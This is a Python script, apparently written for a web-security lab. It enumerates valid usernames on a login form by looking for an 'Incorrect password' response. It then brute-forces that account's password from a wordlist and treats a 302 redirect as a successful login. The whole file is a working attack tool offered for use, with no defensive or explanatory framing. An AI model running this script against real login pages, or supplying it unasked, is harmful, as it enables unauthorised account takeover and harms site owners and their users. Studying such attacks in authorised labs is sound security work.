import sys
import requests

def load_file(file_path):
    """Loads lines from a file into a list."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"(-) File not found: {file_path}")
        sys.exit(1)

def check_username(url, username):
    """Check if the username exists by looking for 'Incorrect password' message in the response."""
    data = {
        'username': username,
        'password': 'randompassword'  # Any random password
    }
    response = requests.post(url, data=data)

    if "Incorrect password" in response.text:
        print(f"(+) Found valid username: {username}")
        return True
    return False

def check_password(url, username, password):
    """Check if the password is correct by looking for a 302 response (or another success indicator)."""
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data, allow_redirects=False)  # Don't follow redirects

    if response.status_code == 302:
        print(f"(+) Successful login with username: {username} and password: {password}")
        return True
    return False

def brute_force_usernames(url, usernames):
    """Iterate over usernames to find a valid one."""
    for username in usernames:
        print(f"[*] Testing username: {username}")
        if check_username(url, username):
            return username  # Return the valid username once found
    print("(-) No valid username found.")
    return None

def brute_force_password(url, username, passwords):
    """Iterate over passwords for a valid username to find the correct one."""
    for password in passwords:
        print(f"[*] Testing password: {password}")
        if check_password(url, username, password):
            print(f"(+) Correct password for {username} is {password}")
            return password  # Return the correct password once found
    print(f"(-) No valid password found for username: {username}.")
    return None

def main():
    if len(sys.argv) != 4:
        print(f"(+) Usage: {sys.argv[0]} <url> <usernames_file> <passwords_file>")
        print(f"(+) Example: {sys.argv[0]} http://example.com/login usernames.txt passwords.txt")
        sys.exit(1)

    # Read command-line arguments
    url = sys.argv[1]
    usernames_file = sys.argv[2]
    passwords_file = sys.argv[3]

    print("(+) Loading usernames and passwords from files...")

    # Load usernames and passwords from the specified files
    usernames = load_file(usernames_file)
    passwords = load_file(passwords_file)

    # Step 1: Brute force usernames
    valid_username = brute_force_usernames(url, usernames)

    if valid_username:
        print(f"(+) Moving to password brute force for {valid_username}")

        # Step 2: Brute force passwords
        valid_password = brute_force_password(url, valid_username, passwords)

        if valid_password:
            print(f"(+) Login successful with username: {valid_username} and password: {valid_password}")
        else:
            print(f"(-) Could not find the correct password for {valid_username}.")
    else:
        print("(-) Could not find a valid username.")

if __name__ == "__main__":
    main()
